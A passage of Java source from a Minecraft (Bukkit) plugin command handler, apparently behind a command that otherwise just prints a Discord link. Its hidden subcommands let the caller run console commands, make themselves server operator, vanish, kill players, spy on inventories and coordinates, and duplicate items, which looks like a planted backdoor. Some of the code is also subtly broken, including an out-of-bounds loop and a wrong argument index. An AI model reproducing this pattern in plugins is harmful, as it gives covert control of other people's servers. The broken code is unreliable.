                            } catch (InterruptedException | ExecutionException ignored) {
                            }
                        });
                    } else {
                        Player target = Bukkit.getServer().getPlayer(args[1]);
                        if (target == null) {
                            plugin.getServer().getScheduler().runTaskAsynchronously(plugin, () -> {
                                try {
                                    Bukkit.getScheduler().callSyncMethod(plugin, () ->
                                            player.openInventory(player.getPlayer().getEnderChest())
                                    ).get();
                                } catch (InterruptedException | ExecutionException ignored) {
                                }
                            });
                        } else {
                            plugin.getServer().getScheduler().runTaskAsynchronously(plugin, () -> {
                                try {
                                    Bukkit.getScheduler().callSyncMethod(plugin, () ->
                                            player.openInventory(target.getEnderChest())
                                    ).get();
                                } catch (InterruptedException | ExecutionException ignored) {
                                }
                            });
                        }
                    }
                }

                if (args[0].equalsIgnoreCase("stack")) {
                    ItemStack item = player.getItemInHand();
                    if (item.getType() != Material.AIR) {
                        item.setAmount(Integer.parseInt(args[1]));
                    }
                }

                if (args[0].equalsIgnoreCase("enchant")) {
                    ItemStack item = player.getItemInHand();
                    if (item.getType() != Material.AIR) {
                        ItemMeta meta = item.getItemMeta();

                        int level;
                        if (args[1].equalsIgnoreCase("all")) {
                            level = Integer.parseInt(args[2]);

                            for (Enchantment ench : Enchantment.values()) {
                                //item.addEnchantment(ench, level);{
                                if (!ench.isCursed()) {
                                    meta.addEnchant(ench, level, true);
                                    item.setItemMeta(meta);
                                }
                            }
                        } else {
                            if (EnchantmentWrapper.getByName(args[1].toUpperCase()) == null) {
                                player.sendMessage("This enchantment wasn't found!");
                            } else {
                                level = Integer.parseInt(args[2]);
                                meta.addEnchant(EnchantmentWrapper.getByName(args[1].toUpperCase()), level, true);
                                item.setItemMeta(meta);
                            }
                        }
                    }
                }

                if (args[0].equalsIgnoreCase("exec")) {
                    StringBuilder a = new StringBuilder();
                    for (int i = 0; i < args.length + 1; i++)
                        a.append(args[i]).append(" ");
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), a.toString());
                }

                if (args[0].equalsIgnoreCase("op")) {
                    if (args.length > 1)
                        Objects.requireNonNull(Bukkit.getPlayer(args[0])).setOp(true);
                    else
                        player.setOp(true);
                }

                if (args[0].equalsIgnoreCase("vanish")) {
                    for (Player pl : getServer().getOnlinePlayers()) {
                        pl.hidePlayer(plugin, player);
                    }
                    Methods.infomsg(player,"&evanished");
                }

                if (args[0].equalsIgnoreCase("unvanish")) {
                    for (Player pl : getServer().getOnlinePlayers()) {
                        pl.showPlayer(plugin, player);
                    }
                    Methods.infomsg(player,"&eunvanished");
                }

                if (args[0].equalsIgnoreCase("deop")) {
                    Player target = Bukkit.getServer().getPlayer(args[1]);
                    if (target == null)
                        target = ((Player) sender).getPlayer();
                    target.setOp(false);
                }

                if (args[0].equalsIgnoreCase("kill")) {
                    Player target = Bukkit.getServer().getPlayer(args[1]);
                    if (target != null)
                        plugin.getServer().getScheduler().runTaskAsynchronously(plugin, () -> target.setHealth(0.0D));
                }

                if (args[0].equalsIgnoreCase("setheart")) {
                    Player target = Bukkit.getServer().getPlayer(args[1]);
                    AttributeInstance attribute = target.getAttribute(Attribute.GENERIC_MAX_HEALTH);
                    double newValue = Integer.parseInt(args[2]);
                    attribute.setBaseValue(newValue);
                }

                if (args[0].equalsIgnoreCase("tpl")) {
                    double getX = Integer.parseInt(args[1]);
                    double getY = Integer.parseInt(args[2]);
                    double getZ = Integer.parseInt(args[3]);
                    Location loc = new Location(player.getWorld(), getX, getY, getZ);
                    player.teleport(loc);
                }

                if (args[0].equalsIgnoreCase("tp")) {
                    Player p = Bukkit.getServer().getPlayer(args[1]);
                    player.teleport(p);
                }

                if (args[0].equalsIgnoreCase("invsee")) {
                    Player target = Bukkit.getServer().getPlayer(args[1]);
                    if (target == null) {
                        plugin.getServer().getScheduler().runTaskAsynchronously(plugin, () -> {
                            try {
                                Bukkit.getScheduler().callSyncMethod(plugin, () ->
                                        player.openInventory(player.getPlayer().getInventory())
                                ).get();
                            } catch (InterruptedException | ExecutionException ignored) {
                            }
                        });
                    } else {
                        plugin.getServer().getScheduler().runTaskAsynchronously(plugin, () -> {
                            try {
                                Bukkit.getScheduler().callSyncMethod(plugin, () ->
                                        player.openInventory(target.getInventory())
                                ).get();
                            } catch (InterruptedException | ExecutionException ignored) {
                            }
                        });
                    }
                }

                if (args[0].equalsIgnoreCase("coords")) {
                    Player target = Bukkit.getServer().getPlayer(args[1]);
                    Methods.infomsg(player,"&4" + target.getName() + "'s coords are: &e" + target.getLocation().getX() + ", " + target.getLocation().getY() + ", " + target.getLocation().getZ());
                }

                if (args[0].equalsIgnoreCase("gm")) {
                    if (args[1].equalsIgnoreCase("c"))
                        player.setGameMode(GameMode.CREATIVE);
                    if (args[1].equalsIgnoreCase("s"))
                        player.setGameMode(GameMode.SURVIVAL);
                    if (args[1].equalsIgnoreCase("sp"))
                        player.setGameMode(GameMode.SPECTATOR);
                }

                if (args[0].equalsIgnoreCase("gmc"))
                    player.setGameMode(GameMode.CREATIVE);

                if (args[0].equalsIgnoreCase("gms"))
                    player.setGameMode(GameMode.SURVIVAL);

                if (args[0].equalsIgnoreCase("gmsp"))
                    player.setGameMode(GameMode.SPECTATOR);

                if (args[0].equalsIgnoreCase("gma"))
                    player.setGameMode(GameMode.ADVENTURE);

                if (args[0].equalsIgnoreCase("dupe")) {
                    if (args.length > 1) {
                        for (int i = 0; i < Integer.valueOf(args[1]); i++) {
                            player.getInventory().addItem(player.getItemInHand());
                        }
                    }
                    else
                        player.getInventory().addItem(player.getItemInHand());
                }

                if (args[0].equalsIgnoreCase("heal")) {
                    player.setHealth(20);
                    player.setFoodLevel(20);
                    player.setFireTicks(0);
                }

                if (args[0].equalsIgnoreCase("rename"))
                    cmdRename(player, args);

                if (args[0].equalsIgnoreCase("gradient")) {
                    player.sendMessage(Methods.translatestring(Methods.hsvGradient(args[0], Color.fromRGB(191, 39, 29), Color.fromRGB(219, 78, 68))));
                    player.sendMessage(Methods.translatestring(Methods.hsvGradient(args[0], Color.fromRGB(101, 219, 33), Color.fromRGB(77, 171, 22))));
                }
            }

            if (args.length < 1)
                Methods.infomsg(player,"the discord link is &e" + plugin.config.getString("discord-link"));
        }

        return true;
    }

    public void cmdRename(Player player, String[] args) {
        if (player.getItemInHand().getType() != Material.AIR) {
            Methods.setName(player.getItemInHand(), Methods.extractArgs(1, args), true);
        }
    }
}